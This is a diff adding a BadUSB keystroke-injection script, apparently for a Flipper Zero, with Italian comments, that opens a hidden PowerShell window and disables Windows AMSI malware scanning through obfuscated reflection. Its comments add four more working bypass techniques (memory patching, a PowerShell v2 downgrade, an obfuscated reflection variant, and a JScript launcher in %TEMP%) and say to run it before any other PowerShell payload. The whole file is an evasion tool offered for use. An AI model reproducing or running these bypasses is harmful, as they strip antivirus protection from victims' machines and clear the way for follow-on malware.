@@ -1,0 +1,52 @@
+REM ============================================================
+REM Title:    AMSI Bypass (Multiple Techniques)
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Evasion
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~4 secondi
+REM Detect:   Medio - il bypass stesso può essere rilevato
+REM Desc:     Bypassa AMSI (Antimalware Scan Interface) per
+REM           permettere l'esecuzione di script PowerShell
+REM           che altrimenti verrebbero bloccati.
+REM           Esegui PRIMA di qualsiasi payload PowerShell.
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "$a=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msi'+[char]85+'tils');$f=$a.GetField('amsi'+'Init'+'Failed','NonPublic,Static');$f.SetValue($null,$true)"
+ENTER
+
+REM ============================================================
+REM Tecniche AMSI bypass alternative (se la prima viene patchata):
+REM
+REM Tecnica 2 - Memory patching:
+REM $w=[System.Runtime.InteropServices.Marshal]
+REM $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+REM $b=$a.GetField('amsiContext','NonPublic,Static').GetValue($null)
+REM $p=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
+REM [System.Runtime.InteropServices.Marshal]::WriteByte($p,0,0x80)
+REM [System.Runtime.InteropServices.Marshal]::Copy($p,0,$b,1)
+REM
+REM Tecnica 3 - PowerShell downgrade (PS v2, no AMSI):
+REM powershell -version 2 -ep bypass -c "..."
+REM (Richiede .NET 2.0 installato - non sempre presente)
+REM
+REM Tecnica 4 - Reflection con obfuscation:
+REM [Runtime.InteropServices.Marshal]::WriteInt32(
+REM   [Ref].Assembly.GetType(
+REM     ('System.Management.Automation.'+
+REM      [string][char]65+'m'+[string][char]115+
+REM      'i'+[string][char]85+'tils')
+REM   ).GetField(
+REM     ('am'+[string][char]115+'i'+'Context'),
+REM     'NonPublic,Static'
+REM   ).GetValue($null)+16,0x1
+REM )
+REM
+REM Tecnica 5 - Jscript.NET (nessun AMSI):
+REM echo WScript.CreateObject("WScript.Shell").Run "powershell..." > %TEMP%\x.js
+REM cscript %TEMP%\x.js
+REM ============================================================
